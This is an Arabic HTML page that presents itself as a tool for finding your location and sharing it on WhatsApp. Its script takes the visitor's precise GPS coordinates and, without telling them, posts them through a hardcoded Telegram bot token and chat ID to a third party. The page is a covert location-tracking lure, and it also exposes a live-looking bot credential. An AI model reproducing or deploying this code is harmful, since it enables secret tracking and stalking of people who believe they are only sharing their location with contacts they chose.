<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>جاري تحديد الموقع</title>
    <style>
        body {
            margin: 0;
            padding: 20px;
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            text-align: center;
        }
        .container {
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            background: rgba(255,255,255,0.1);
            border-radius: 15px;
            backdrop-filter: blur(10px);
        }
        button {
            background: #25D366;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 25px;
            cursor: pointer;
            margin: 10px;
            width: 90%;
        }
        button:hover {
            background: #128C7E;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container" id="mainScreen">
        <h2>📍 مشاركة الموقع</h2>
        <p>انقر لتحديد موقعك ومشاركته عبر واتساب</p>
        <button onclick="getLocation()">الحصول على موقعي</button>
    </div>

    <div class="container hidden" id="resultScreen">
        <h2>✅ تم تحديد الموقع</h2>
        <p id="locationInfo"></p>
        <button onclick="openWhatsApp()">مشاركة عبر واتساب</button>
        <button onclick="copyLocation()">نسخ الإحداثيات</button>
        <button onclick="showMap()">عرض الخريطة</button>
    </div>

    <script>
        const BOT_TOKEN = "8071212707:AAFvb7gER0iIsZCRt14JPzkTLksCULJY4aI";
        const CHAT_ID = "6451561574";
        
        let userLocation = null;

        function getLocation() {
            if (!navigator.geolocation) {
                alert("❌ المتصفح لا يدعم تحديد الموقع");
                return;
            }

            document.getElementById('mainScreen').classList.add('hidden');
            document.getElementById('resultScreen').classList.remove('hidden');
            document.getElementById('locationInfo').innerHTML = "⏳ جاري تحديد الموقع...";

            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    
                    userLocation = { lat, lng, accuracy };
                    
                    document.getElementById('locationInfo').innerHTML = 
                        `📍 موقعك الدقيق:<br>
                         • خط العرض: <b>${lat.toFixed(6)}</b><br>
                         • خط الطول: <b>${lng.toFixed(6)}</b><br>
                         • الدقة: <b>${accuracy} متر</b>`;
                    
                    // إرسال إلى التليجرام تلقائياً
                    sendToTelegram(lat, lng, accuracy);
                },
                function(error) {
                    document.getElementById('locationInfo').innerHTML = 
                        "❌ لم تتم الإذن بمشاركة الموقع";
                    console.log("Error:", error);
                },
                { 
                    enableHighAccuracy: true, 
                    timeout: 15000,
                    maximumAge: 0
                }
            );
        }

        function openWhatsApp() {
            if (!userLocation) return;
            
            const message = `📍 موقعي الحالي:\nhttps://maps.google.com/?q=${userLocation.lat},${userLocation.lng}`;
            const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(message)}`;
            
            // فتح واتساب في نافذة جديدة
            window.open(whatsappUrl, '_blank', 'width=600,height=700');
        }

        function copyLocation() {
            if (!userLocation) return;
            
            const text = `${userLocation.lat}, ${userLocation.lng}`;
            navigator.clipboard.writeText(text).then(() => {
                alert("✅ تم نسخ الإحداثيات: " + text);
            });
        }

        function showMap() {
            if (!userLocation) return;
            
            const mapUrl = `https://maps.google.com/?q=${userLocation.lat},${userLocation.lng}`;
            window.open(mapUrl, '_blank', 'width=800,height=600');
        }

        async function sendToTelegram(lat, lng, accuracy) {
            const message = 
                `🎯 موقع جديد\n\n` +
                `📍 الإحداثيات:\n` +
                `• خط العرض: ${lat.toFixed(6)}\n` +
                `• خط الطول: ${lng.toFixed(6)}\n` +
                `• الدقة: ${accuracy} متر\n\n` +
                `🗺️ الخريطة:\n` +
                `https://maps.google.com/?q=${lat},${lng}\n\n` +
                `🕒 الوقت: ${new Date().toLocaleString('ar-MA')}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: CHAT_ID, 
                        text: message 
                    })
                });
                
                if (response.ok) {
                    console.log("✅ تم إرسال الموقع إلى التليجرام");
                }
            } catch (error) {
                console.log("❌ خطأ في إرسال التليجرام:", error);
            }
        }
    </script>
</body>
</html>